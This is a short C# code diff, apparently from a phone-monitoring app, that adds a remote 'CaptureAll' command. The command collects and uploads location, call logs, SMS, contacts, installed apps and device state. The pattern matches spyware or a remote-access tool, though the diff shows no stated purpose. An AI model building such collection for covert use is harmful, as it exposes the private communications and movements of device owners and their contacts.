@@ -53,6 +53,15 @@ public sealed class CommandExecutor
                     await _bgService.DirectCollectAndPushAsync("apps", CancellationToken.None);
                     break;
 
+                case CommandTypes.CaptureAll:
+                    await _bgService.DirectCollectAndPushAsync("location", CancellationToken.None);
+                    await _bgService.DirectCollectAndPushAsync("call_logs", CancellationToken.None);
+                    await _bgService.DirectCollectAndPushAsync("sms", CancellationToken.None);
+                    await _bgService.DirectCollectAndPushAsync("contacts", CancellationToken.None);
+                    await _bgService.DirectCollectAndPushAsync("apps", CancellationToken.None);
+                    await _bgService.DirectCollectAndPushAsync("state", CancellationToken.None);
+                    break;
+
                 case CommandTypes.CaptureScreenshot:
                     await _bgService.CaptureScreenshotAsync();
                     await _bgService.SyncAllPendingAsync();
